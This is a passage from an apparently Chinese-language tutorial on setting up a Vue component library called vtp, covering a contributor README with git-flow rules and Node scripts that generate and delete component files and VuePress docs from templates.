</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="主入口-readme" tabindex="-1"> 主入口 README</h3>
<div><pre><code><span><span>#</span> 指南</span>

<span><span>##</span> 介绍</span>

::: tip 提示

开箱即用的 Vue 组件库

:::

<span><span>##</span> Install</span>

\ <span>`\`</span> \`bash npm install vtp

<span><span>#</span> or</span>

yarn add vtp \ <span>`\`</span> \`

<span><span>##</span> Used</span>

<span><span>###</span> 一键全局引入</span>

\ <span>`\`</span> \`javascript import Vue from 'vue' import Vtp from 'vtp'

Vue.use(Vtp) \ <span>`\`</span> \`

<span><span>###</span> 按需引入</span>

\ <span>`\`</span> \`javascript import Vue from 'vue' import { VtpButton } from 'vtp'

Vue.use(VtpButton) \ <span>`\`</span> \`

<span><span>##</span> 组件库贡献指南</span>

::: danger 必读

组件库贡献必读, 请严格按照下列贡献指南

:::

<span>1.</span>  第一次使用该组件库时, 请执行命令 <span>`npm run init`</span>
<span>2.</span>  推荐使用 <span>[<span>git-flow 工作流</span>](<span>https://www.git-tower.com/learn/git/ebook/cn/command-line/advanced-topics/git-flow</span>)</span>, 确保一个组件一个分支, 使用命令 <span>`git flow feature start [组件名]`</span> , 开发结束之后需要使用命令 <span>`git flow feature finish [组件名]`</span> 该命令将会自动进行分支合并以及删除当前分支
<span>3.</span>  当需要对一个已存在的组件进行更新维护或者升级时, 请使用命令 <span>`git flow hotfix start [组件名]`</span> , 开发结束之后需要使用命令 <span>`git flow hotfix finish [组件名]`</span> 该命令将会自动进行分支合并以及删除当前分支
<span>4.</span>  当需要对一个已存在的组件进行 bug 修复时, 请使用命令 <span>`git flow bugfix start [组件名]`</span> , 开发结束之后需要使用命令 <span>`git flow bugfix finish [组件名]`</span> 该命令将会自动进行分支合并以及删除当前组件分支
<span>5.</span>  强制使用已配置脚本命令 <span>`yarn new:comp`</span> 来创建一个组件以及组件文档(已包含默认模板, 在此基础上修改即可), 使用命令 <span>`yarn del:comp`</span> 来删除不需要的组件
<span>6.</span>  使用 <span>`git cz`</span> 替换 <span>`git commit -m`</span> , commit 之前请详细阅读 <span>[<span>git commit 规范指南</span>](<span>/archives/fdd4f330.html</span>)</span>
<span>7.</span>  组件发布前, 请确保当前版本的所有包含组件已经全部开发完毕并且已经合并至 develop 分支

<span>    - 在 develop 分支中使用 `git flow release start [版本号]` 创建一个发布版本分支
    - 修改 `package.json` 中的 `version` 字段为当前的版本号
    - 执行 `npm run docs:build` 编译 vuepress 文档
    - 执行 `npm run build:lib` 编译 组件库
    - 执行 `npm run changelog` 生成当前版本的 CHANGELOHG
    - 以上操作可使用命令 `npm run build` 来代替 `npm run docs:build` 、 `npm run build:lib` 、 `npm run changelog`
    - 进行 commit 操作
    - 使用 `git flow release finish [版本号]` 自动进行分支合并以及删除当前分支, 期间将会询问 tag 的 commit 信息(务必认真填写)
    - 以上操作之后将会把分支自动合并至 master 和 develop 分支</span>

<span>8.</span>  分支永远只能有两个 master 和 develop 分支, 其他分支应该在开发完毕之后及时的进行合并、删除操作
<span>9.</span>  发布前请确保 tag 已经打包成功, 当前版本的功能已经全部完成, 之后便可以直接运行 <span>`npm publish --registry &lt;私有库地址>`</span> , 如果组件库目录下有配置 <span>`.npmrc`</span> 则直接使用 <span>`npm publish`</span>
<span>10.</span> 下载组件库 <span>`yarn add &lt;组件库名> --registry &lt;私有库地址>`</span> , 如果组件库目录下有配置 <span>`.npmrc`</span> 则直接使用 <span>`yarn add &lt;组件库名> `</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="创建组件和组件文档生成脚本" tabindex="-1"> 创建组件和组件文档生成脚本</h3>
<p>在 <code>scripts</code> 中创建以下几个文件, 其中 <code>create-comp.js</code> 是用来生成自定义组件目录和自定义组件说明文档脚本, <code>delete-comp.js</code> 是用来删除无用的组件目录和自定义组件说明文档脚本, <code>template.js</code> 是生成代码的模板文件</p>
<div><pre><code>|-- create-comp.js
|
|-- delete-comp.js
|
|-- template.js
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div></div></div><p>相关的代码如下, 小主可以根据自己的需求进行相应的简单修改, 下面的代码参考来源 <a href="https://juejin.im/post/5c6772ff518825629c56943c" target="_blank" rel="noopener noreferrer">vue-cli3 项目优化之通过 node 自动生成组件模板 generate View、Component</a>, 当然也是第一弹中的代码改进</p>
<p>全局可配置一些变量</p>
<p><code>config.js</code></p>
<div><pre><code>module<span>.</span>exports <span>=</span> <span>{</span>
  <span>prefix</span><span>:</span> <span>"vtp"</span><span>,</span> <span>// 组件库的前缀,使用小写</span>
  <span>docsTitle</span><span>:</span> <span>"vtp-component"</span><span>,</span> <span>// 文档的标题</span>
  <span>base</span><span>:</span> <span>"/"</span><span>,</span> <span>// vuepress 中的 base 配置</span>
  <span>ElementUI</span><span>:</span> <span>true</span><span>,</span> <span>// 引入 element-ui 表示二次封装 element-ui</span>
<span>}</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p><code>create-comp.js</code></p>
<div><pre><code><span>// 创建自定义组件脚本</span>

<span>const</span> chalk <span>=</span> <span>require</span><span>(</span><span>"chalk"</span><span>)</span><span>;</span>
<span>const</span> path <span>=</span> <span>require</span><span>(</span><span>"path"</span><span>)</span><span>;</span>
<span>const</span> fs <span>=</span> <span>require</span><span>(</span><span>"fs-extra"</span><span>)</span><span>;</span>
<span>const</span> uppercamelize <span>=</span> <span>require</span><span>(</span><span>"uppercamelcase"</span><span>)</span><span>;</span>
<span>const</span> <span>resolve</span> <span>=</span> <span>(</span><span><span>...</span>file</span><span>)</span> <span>=></span> path<span>.</span><span>resolve</span><span>(</span>__dirname<span>,</span> <span>...</span>file<span>)</span><span>;</span>
<span>const</span> <span>log</span> <span>=</span> <span>(</span><span>message</span><span>)</span> <span>=></span> console<span>.</span><span>log</span><span>(</span>chalk<span>.</span><span>green</span><span>(</span><span><span>`</span><span><span>${</span>message<span>}</span></span><span>`</span></span><span>)</span><span>)</span><span>;</span>
<span>const</span> <span>successLog</span> <span>=</span> <span>(</span><span>message</span><span>)</span> <span>=></span> console<span>.</span><span>log</span><span>(</span>chalk<span>.</span><span>blue</span><span>(</span><span><span>`</span><span><span>${</span>message<span>}</span></span><span>`</span></span><span>)</span><span>)</span><span>;</span>
<span>const</span> <span>errorLog</span> <span>=</span> <span>(</span><span>error</span><span>)</span> <span>=></span> console<span>.</span><span>log</span><span>(</span>chalk<span>.</span><span>red</span><span>(</span><span><span>`</span><span><span>${</span>error<span>}</span></span><span>`</span></span><span>)</span><span>)</span><span>;</span>
<span>const</span> <span>{</span>
  vueTemplate<span>,</span>
  entryTemplate<span>,</span>
  scssTemplate<span>,</span>
  mdDocs<span>,</span>
<span>}</span> <span>=</span> <span>require</span><span>(</span><span>"./template"</span><span>)</span><span>;</span>

<span>const</span> <span>generateFile</span> <span>=</span> <span>(</span><span>path<span>,</span> data</span><span>)</span> <span>=></span> <span>{</span>
  <span>if</span> <span>(</span>fs<span>.</span><span>existsSync</span><span>(</span>path<span>)</span><span>)</span> <span>{</span>
    <span>errorLog</span><span>(</span><span><span>`</span><span><span>${</span>path<span>}</span></span><span>文件已存在</span><span>`</span></span><span>)</span><span>;</span>
    <span>return</span><span>;</span>
  <span>}</span>
  <span>return</span> <span>new</span> <span>Promise</span><span>(</span><span>(</span><span>resolve<span>,</span> reject</span><span>)</span> <span>=></span> <span>{</span>
    fs<span>.</span><span>writeFile</span><span>(</span>path<span>,</span> data<span>,</span> <span>"utf8"</span><span>,</span> <span>(</span><span>err</span><span>)</span> <span>=></span> <span>{</span>
      <span>if</span> <span>(</span>err<span>)</span> <span>{</span>
        <span>errorLog</span><span>(</span>err<span>.</span>message<span>)</span><span>;</span>
        <span>reject</span><span>(</span>err<span>)</span><span>;</span>
      <span>}</span> <span>else</span> <span>{</span>
        <span>resolve</span><span>(</span><span>true</span><span>)</span><span>;</span>
      <span>}</span>
    <span>}</span><span>)</span><span>;</span>
  <span>}</span><span>)</span><span>;</span>
<span>}</span><span>;</span>

<span>// 这里生成自定义组件</span>
<span>log</span><span>(</span><span>"请输入要生成的组件名称, 形如 demo 或者 demo-test"</span><span>)</span><span>;</span>
<span>let</span> componentName <span>=</span> <span>""</span><span>;</span>
process<span>.</span>stdin<span>.</span><span>on</span><span>(</span><span>"data"</span><span>,</span> <span>async</span> <span>(</span><span>chunk</span><span>)</span> <span>=></span> <span>{</span>
  <span>const</span> inputName <span>=</span> <span>String</span><span>(</span>chunk<span>)</span><span>.</span><span>trim</span><span>(</span><span>)</span><span>.</span><span>toString</span><span>(</span><span>)</span><span>;</span>
  <span>const</span> upperInputname <span>=</span> <span>uppercamelize</span><span>(</span>inputName<span>)</span><span>;</span>
  <span>const</span> componentDirectory <span>=</span> <span>resolve</span><span>(</span><span>"../packages"</span><span>,</span> upperInputname<span>)</span><span>;</span>
  <span>const</span> componentVueName <span>=</span> <span>resolve</span><span>(</span>componentDirectory<span>,</span> <span><span>`</span><span><span>${</span>upperInputname<span>}</span></span><span>.vue</span><span>`</span></span><span>)</span><span>;</span>
  <span>const</span> scssName <span>=</span> <span>resolve</span><span>(</span>componentDirectory<span>,</span> <span><span>`</span><span><span>${</span>inputName<span>}</span></span><span>.scss</span><span>`</span></span><span>)</span><span>;</span>
  <span>const</span> entryComponentName <span>=</span> <span>resolve</span><span>(</span>componentDirectory<span>,</span> <span>"index.js"</span><span>)</span><span>;</span>

  <span>const</span> hasComponentDirectory <span>=</span> fs<span>.</span><span>existsSync</span><span>(</span>componentDirectory<span>)</span><span>;</span>
  <span>if</span> <span>(</span>upperInputname<span>)</span> <span>{</span>
    <span>// 这里生成组件</span>
    <span>if</span> <span>(</span>hasComponentDirectory<span>)</span> <span>{</span>
      <span>errorLog</span><span>(</span><span><span>`</span><span><span>${</span>upperInputname<span>}</span></span><span>组件目录已存在, 请重新输入</span><span>`</span></span><span>)</span><span>;</span>
      <span>return</span><span>;</span>
    <span>}</span> <span>else</span> <span>{</span>
      <span>log</span><span>(</span><span><span>`</span><span>生成 component 目录 </span><span><span>${</span>componentDirectory<span>}</span></span><span>`</span></span><span>)</span><span>;</span>
      <span>await</span> <span>dotExistDirectoryCreate</span><span>(</span>componentDirectory<span>)</span><span>;</span>
    <span>}</span>
    <span>try</span> <span>{</span>
      <span>if</span> <span>(</span>upperInputname<span>.</span><span>includes</span><span>(</span><span>"/"</span><span>)</span><span>)</span> <span>{</span>
        <span>const</span> inputArr <span>=</span> upperInputname<span>.</span><span>split</span><span>(</span><span>"/"</span><span>)</span><span>;</span>
        componentName <span>=</span> inputArr<span>[</span>inputArr<span>.</span>length <span>-</span> <span>1</span><span>]</span><span>;</span>
      <span>}</span> <span>else</span> <span>{</span>
        componentName <span>=</span> upperInputname<span>;</span>
      <span>}</span>
      <span>log</span><span>(</span><span><span>`</span><span>生成 vue 文件 </span><span><span>${</span>componentVueName<span>}</span></span><span>`</span></span><span>)</span><span>;</span>
      <span>await</span> <span>generateFile</span><span>(</span>componentVueName<span>,</span> <span>vueTemplate</span><span>(</span>inputName<span>)</span><span>)</span><span>;</span>
      <span>log</span><span>(</span><span><span>`</span><span>生成 scss 文件 </span><span><span>${</span>scssName<span>}</span></span><span>`</span></span><span>)</span><span>;</span>
      <span>await</span> <span>generateFile</span><span>(</span>scssName<span>,</span> <span>scssTemplate</span><span>(</span>inputName<span>)</span><span>)</span><span>;</span>
      <span>log</span><span>(</span><span><span>`</span><span>生成 entry 文件 </span><span><span>${</span>entryComponentName<span>}</span></span><span>`</span></span><span>)</span><span>;</span>
      <span>await</span> <span>generateFile</span><span>(</span>entryComponentName<span>,</span> <span>entryTemplate</span><span>(</span>componentName<span>)</span><span>)</span><span>;</span>
      <span>successLog</span><span>(</span><span>"生成 component 成功"</span><span>)</span><span>;</span>
    <span>}</span> <span>catch</span> <span>(</span>e<span>)</span> <span>{</span>
      <span>errorLog</span><span>(</span>e<span>.</span>message<span>)</span><span>;</span>
    <span>}</span>
  <span>}</span> <span>else</span> <span>{</span>
    <span>errorLog</span><span>(</span><span><span>`</span><span>请重新输入组件名称:</span><span>`</span></span><span>)</span><span>;</span>
    <span>return</span><span>;</span>
  <span>}</span>

  <span>// 这里生成自定义组件说明文档</span>
  <span>const</span> docsDirectory <span>=</span> <span>resolve</span><span>(</span><span>"../docs/component"</span><span>)</span><span>;</span>
  <span>const</span> docsMdName <span>=</span> <span>resolve</span><span>(</span>docsDirectory<span>,</span> <span><span>`</span><span><span>${</span>upperInputname<span>}</span></span><span>.md</span><span>`</span></span><span>)</span><span>;</span>

  <span>try</span> <span>{</span>
    <span>log</span><span>(</span><span><span>`</span><span>生成 component 文档 </span><span><span>${</span>docsMdName<span>}</span></span><span>`</span></span><span>)</span><span>;</span>
    <span>await</span> <span>generateFile</span><span>(</span>docsMdName<span>,</span> <span>mdDocs</span><span>(</span><span><span>`</span><span><span>${</span>inputName<span>}</span></span><span>`</span></span><span>)</span><span>)</span><span>;</span>
    <span>successLog</span><span>(</span><span>"生成 component 文档成功"</span><span>)</span><span>;</span>
  <span>}</span> <span>catch</span> <span>(</span>e<span>)</span> <span>{</span>
    <span>errorLog</span><span>(</span>e<span>.</span>message<span>)</span><span>;</span>
  <span>}</span>

  process<span>.</span>stdin<span>.</span><span>emit</span><span>(</span><span>"end"</span><span>)</span><span>;</span>
<span>}</span><span>)</span><span>;</span>

process<span>.</span>stdin<span>.</span><span>on</span><span>(</span><span>"end"</span><span>,</span> <span>(</span><span>)</span> <span>=></span> <span>{</span>
  <span>log</span><span>(</span><span>"exit"</span><span>)</span><span>;</span>
  process<span>.</span><span>exit</span><span>(</span><span>)</span><span>;</span>
<span>}</span><span>)</span><span>;</span>

<span>function</span> <span>dotExistDirectoryCreate</span><span>(</span><span>directory</span><span>)</span> <span>{</span>
  <span>return</span> <span>new</span> <span>Promise</span><span>(</span><span>(</span><span>resolve</span><span>)</span> <span>=></span> <span>{</span>
    <span>mkdirs</span><span>(</span>directory<span>,</span> <span>function</span> <span>(</span><span>)</span> <span>{</span>
      <span>resolve</span><span>(</span><span>true</span><span>)</span><span>;</span>
    <span>}</span><span>)</span><span>;</span>
  <span>}</span><span>)</span><span>;</span>
<span>}</span>

<span>// 递归创建目录</span>
<span>function</span> <span>mkdirs</span><span>(</span><span>directory<span>,</span> callback</span><span>)</span> <span>{</span>
  <span>var</span> exists <span>=</span> fs<span>.</span><span>existsSync</span><span>(</span>directory<span>)</span><span>;</span>
  <span>if</span> <span>(</span>exists<span>)</span> <span>{</span>
    <span>callback</span><span>(</span><span>)</span><span>;</span>
  <span>}</span> <span>else</span> <span>{</span>
    <span>mkdirs</span><span>(</span>path<span>.</span><span>dirname</span><span>(</span>directory<span>)</span><span>,</span> <span>function</span> <span>(</span><span>)</span> <span>{</span>
      fs<span>.</span><span>mkdirSync</span><span>(</span>directory<span>)</span><span>;</span>
      <span>callback</span><span>(</span><span>)</span><span>;</span>
    <span>}</span><span>)</span><span>;</span>
  <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p><code>delete-comp.js</code></p>
<div><pre><code><span>// 删除自定义组件脚本</span>

<span>const</span> chalk <span>=</span> <span>require</span><span>(</span><span>"chalk"</span><span>)</span><span>;</span>
<span>const</span> path <span>=</span> <span>require</span><span>(</span><span>"path"</span><span>)</span><span>;</span>
<span>const</span> fs <span>=</span> <span>require</span><span>(</span><span>"fs-extra"</span><span>)</span><span>;</span>
<span>const</span> uppercamelize <span>=</span> <span>require</span><span>(</span><span>"uppercamelcase"</span><span>)</span><span>;</span>
<span>const</span> <span>resolve</span> <span>=</span> <span>(</span><span><span>...</span>file</span><span>)</span> <span>=></span> path<span>.</span><span>resolve</span><span>(</span>__dirname<span>,</span> <span>...</span>file<span>)</span><span>;</span>
<span>const</span> <span>log</span> <span>=</span> <span>(</span><span>message</span><span>)</span> <span>=></span> console<span>.</span><span>log</span><span>(</span>chalk<span>.</span><span>green</span><span>(</span><span><span>`</span><span><span>${</span>message<span>}</span></span><span>`</span></span><span>)</span><span>)</span><span>;</span>
<span>const</span> <span>successLog</span> <span>=</span> <span>(</span><span>message</span><span>)</span> <span>=></span> console<span>.</span><span>log</span><span>(</span>chalk<span>.</span><span>blue</span><span>(</span><span><span>`</span><span><span>${</span>message<span>}</span></span><span>`</span></span><span>)</span><span>)</span><span>;</span>
<span>const</span> <span>errorLog</span> <span>=</span> <span>(</span><span>error</span><span>)</span> <span>=></span> console<span>.</span><span>log</span><span>(</span>chalk<span>.</span><span>red</span><span>(</span><span><span>`</span><span><span>${</span>error<span>}</span></span><span>`</span></span><span>)</span><span>)</span><span>;</span>

<span>log</span><span>(</span><span>"请输入要删除的组件名称, 形如 demo 或者 demo-test"</span><span>)</span><span>;</span>
process<span>.</span>stdin<span>.</span><span>on</span><span>(</span><span>"data"</span><span>,</span> <span>async</span> <span>(</span><span>chunk</span><span>)</span> <span>=></span> <span>{</span>
  <span>let</span> inputName <span>=</span> <span>String</span><span>(</span>chunk<span>)</span><span>.</span><span>trim</span><span>(</span><span>)</span><span>.</span><span>toString</span><span>(</span><span>)</span><span>;</span>
  inputName <span>=</span> <span>uppercamelize</span><span>(</span>inputName<span>)</span><span>;</span>
  <span>const</span> componentDirectory <span>=</span> <span>resolve</span><span>(</span><span>"../packages"</span><span>,</span> inputName<span>)</span><span>;</span>

  <span>const</span> hasComponentDirectory <span>=</span> fs<span>.</span><span>existsSync</span><span>(</span>componentDirectory<span>)</span><span>;</span>

  <span>const</span> docsDirectory <span>=</span> <span>resolve</span><span>(</span><span>"../docs/component"</span><span>)</span><span>;</span>
  <span>const</span> docsMdName <span>=</span> <span>resolve</span><span>(</span>docsDirectory<span>,</span> <span><span>`</span><span><span>${</span>inputName<span>}</span></span><span>.md</span><span>`</span></span><span>)</span><span>;</span>
  <span>if</span> <span>(</span>inputName<span>)</span> <span>{</span>
    <span>if</span> <span>(</span>hasComponentDirectory<span>)</span> <span>{</span>
      <span>log</span><span>(</span><span><span>`</span><span>删除 component 目录 </span><span><span>${</span>componentDirectory<span>}</span></span><span>`</span></span><span>)</span><span>;</span>
      <span>await</span> <span>removePromise</span><span>(</span>componentDirectory<span>)</span><span>;</span>
      <span>successLog</span><span>(</span><span><span>`</span><span>已删除 </span><span><span>${</span>inputName<span>}</span></span><span> 组件目录</span><span>`</span></span><span>)</span><span>;</span>

      <span>log</span><span>(</span><span><span>`</span><span>删除 component 文档 </span><span><span>${</span>docsMdName<span>}</span></span><span>`</span></span><span>)</span><span>;</span>
      fs<span>.</span><span>unlink</span><span>(</span>docsMdName<span>)</span><span>;</span>
      <span>successLog</span><span>(</span><span><span>`</span><span>已删除 </span><span><span>${</span>inputName<span>}</span></span><span> 组件说明文档</span><span>`</span></span><span>)</span><span>;</span>
    <span>}</span> <span>else</span> <span>{</span>
      <span>errorLog</span><span>(</span><span><span>`</span><span><span>${</span>inputName<span>}</span></span><span>组件目录不存在</span><span>`</span></span><span>)</span><span>;</span>
      <span>return</span><span>;</span>
    <span>}</span>
  <span>}</span> <span>else</span> <span>{</span>
    <span>errorLog</span><span>(</span><span><span>`</span><span>请重新输入组件名称:</span><span>`</span></span><span>)</span><span>;</span>
    <span>return</span><span>;</span>
  <span>}</span>

  process<span>.</span>stdin<span>.</span><span>emit</span><span>(</span><span>"end"</span><span>)</span><span>;</span>
<span>}</span><span>)</span><span>;</span>

process<span>.</span>stdin<span>.</span><span>on</span><span>(</span><span>"end"</span><span>,</span> <span>(</span><span>)</span> <span>=></span> <span>{</span>
  <span>log</span><span>(</span><span>"exit"</span><span>)</span><span>;</span>
  process<span>.</span><span>exit</span><span>(</span><span>)</span><span>;</span>
<span>}</span><span>)</span><span>;</span>

<span>function</span> <span>removePromise</span><span>(</span><span>dir</span><span>)</span> <span>{</span>
  <span>return</span> <span>new</span> <span>Promise</span><span>(</span><span>function</span> <span>(</span><span>resolve<span>,</span> reject</span><span>)</span> <span>{</span>
    <span>// 先读文件夹</span>
    fs<span>.</span><span>stat</span><span>(</span>dir<span>,</span> <span>function</span> <span>(</span><span>_err<span>,</span> stat</span><span>)</span> <span>{</span>
      <span>if</span> <span>(</span>stat<span>.</span><span>isDirectory</span><span>(</span><span>)</span><span>)</span> <span>{</span>
        fs<span>.</span><span>readdir</span><span>(</span>dir<span>,</span> <span>function</span> <span>(</span><span>_err<span>,</span> files</span><span>)</span> <span>{</span>
          files <span>=</span> files<span>.</span><span>map</span><span>(</span><span>(</span><span>file</span><span>)</span> <span>=></span> path<span>.</span><span>join</span><span>(</span>dir<span>,</span> file<span>)</span><span>)</span><span>;</span> <span>// a/b  a/m</span>
          files <span>=</span> files<span>.</span><span>map</span><span>(</span><span>(</span><span>file</span><span>)</span> <span>=></span> <span>removePromise</span><span>(</span>file<span>)</span><span>)</span><span>;</span> <span>// 这时候变成了promise</span>
          Promise<span>.</span><span>all</span><span>(</span>files<span>)</span><span>.</span><span>then</span><span>(</span><span>function</span> <span>(</span><span>)</span> <span>{</span>
            fs<span>.</span><span>rmdir</span><span>(</span>dir<span>,</span> resolve<span>)</span><span>;</span>
          <span>}</span><span>)</span><span>;</span>
        <span>}</span><span>)</span><span>;</span>
      <span>}</span> <span>else</span> <span>{</span>
        fs<span>.</span><span>unlink</span><span>(</span>dir<span>,</span> resolve<span>)</span><span>;</span>
      <span>}</span>
    <span>}</span><span>)</span><span>;</span>
  <span>}</span><span>)</span><span>;</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p><code>template.js</code></p>
<div><pre><code><span>const</span> uppercamelize <span>=</span> <span>require</span><span>(</span><span>'uppercamelcase'</span><span>)</span>
<span>const</span> config <span>=</span> <span>require</span><span>(</span><span>'../config'</span><span>)</span>

module<span>.</span>exports <span>=</span> <span>{</span>
    <span>vueTemplate</span><span>:</span> <span>compoenntName</span> <span>=></span> <span>{</span>
        <span>return</span> <span><span>`</span><span>&lt;template>
  &lt;divtoken interpolation"><span>${</span>config<span>.</span>prefix<span>}</span></span><span>-</span><span><span>${</span>compoenntName<span>}</span></span><span>">
    </span><span><span>${</span>compoenntName<span>}</span></span><span>
  &lt;/div>
&lt;/template>

&lt;script>
export default {
  name: '</span><span><span>${</span>config<span>.</span>prefix<span>}</span></span><span>-</span><span><span>${</span>compoenntName<span>}</span></span><span>',

  data () {
    return {}
  },

  props: {},

  methods: {}
}
&lt;/script>

&lt;style lang="scss">
  @import './</span><span><span>${</span>compoenntName<span>}</span></span><span>';
&lt;/style>
</span><span>`</span></span>
    <span>}</span><span>,</span>
    <span>entryTemplate</span><span>:</span> <span>compoenntName</span> <span>=></span> <span>{</span>
        <span>return</span> <span><span>`</span><span>import </span><span><span>${</span>compoenntName<span>}</span></span><span> from './</span><span><span>${</span>compoenntName<span>}</span></span><span>'

</span><span><span>${</span>compoenntName<span>}</span></span><span>.install = function (Vue) {
  Vue.component(</span><span><span>${</span>compoenntName<span>}</span></span><span>.name, </span><span><span>${</span>compoenntName<span>}</span></span><span>)
}

export default </span><span><span>${</span>compoenntName<span>}</span></span><span>

if (typeof window !== 'undefined' &amp;&amp; window.Vue) {
  window.Vue.component(</span><span><span>${</span>compoenntName<span>}</span></span><span>.name, </span><span><span>${</span>compoenntName<span>}</span></span><span>)
}
</span><span>`</span></span>
    <span>}</span><span>,</span>
    <span>scssTemplate</span><span>:</span> <span>compoenntName</span> <span>=></span> <span>{</span>
        <span>return</span> <span><span>`</span><span>.</span><span><span>${</span>config<span>.</span>prefix<span>}</span></span><span>-</span><span><span>${</span>compoenntName<span>}</span></span><span> {}</span><span>`</span></span>
    <span>}</span><span>,</span>
    <span>mdDocs</span><span>:</span> <span>compoenntName</span> <span>=></span> <span>{</span>
        <span>const</span> upperCompoenntName <span>=</span> <span>uppercamelize</span><span>(</span>compoenntName<span>)</span>
        <span>const</span> upperPrefix <span>=</span> <span>uppercamelize</span><span>(</span>config<span>.</span>prefix<span>)</span>

        <span>return</span> <span><span>`</span><span># </span><span><span>${</span>compoenntName<span>}</span></span><span>

::: tip 提示
</span><span><span>${</span>compoenntName<span>}</span></span><span>
:::

## Code Demo

::: demo 基础用法

\ </span><span>`</span></span>\<span><span>`</span><span> \` vue
&lt;</span><span><span>${</span>config<span>.</span>prefix<span>}</span></span><span>-</span><span><span>${</span>compoenntName<span>}</span></span><span>>&lt;/</span><span><span>${</span>config<span>.</span>prefix<span>}</span></span><span>-</span><span><span>${</span>compoenntName<span>}</span></span><span>>
\ </span><span>`</span></span>\<span><span>`</span><span> \`
:::

## Used

### 按需引入

\ </span><span>`</span></span>\<span><span>`</span><span> \`javascript
import Vue from 'vue'
import {
  </span><span><span>${</span>upperPrefix<span>}</span></span><span><span>${</span>upperCompoenntName<span>}</span></span><span>
} from '</span><span><span>${</span>config<span>.</span>prefix<span>}</span></span><span>'

Vue.use(</span><span><span>${</span>upperPrefix<span>}</span></span><span><span>${</span>upperCompoenntName<span>}</span></span><span>)
\ </span><span>`</span></span>\<span><span>`</span><span> \`

### 局部引入

\ </span><span>`</span></span>\<span><span>`</span><span> \` javascript
import {
  </span><span><span>${</span>upperPrefix<span>}</span></span><span><span>${</span>upperCompoenntName<span>}</span></span><span>
} from '</span><span><span>${</span>config<span>.</span>prefix<span>}</span></span><span>'

export default {
  components: {
    </span><span><span>${</span>upperPrefix<span>}</span></span><span><span>${</span>upperCompoenntName<span>}</span></span><span>
  }
}
\ </span><span>`</span></span>\<span><span>`</span><span> \`

## API

### Props

| 参数 | 说明 | 类型 | 可选值 | 默认值 | 版本 |
| ---- | ---- | ---- | ------ | ------ | ---- |
| -    | -    | -    | -      | -      | -    |

### Events

| 事件名 | 说明 | 回调参数 |
| ------ | ---- | -------- |
| -      | -    | -        |

</span><span>`</span></span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>在 <code>build</code> 中创建以下几个文件, 其中 <code>build-entry.js</code> 脚本是用来生成自定义组件导出 <code>packages/index.js</code> , <code>get-components.js</code> 脚本是用来获取 <code>packages</code> 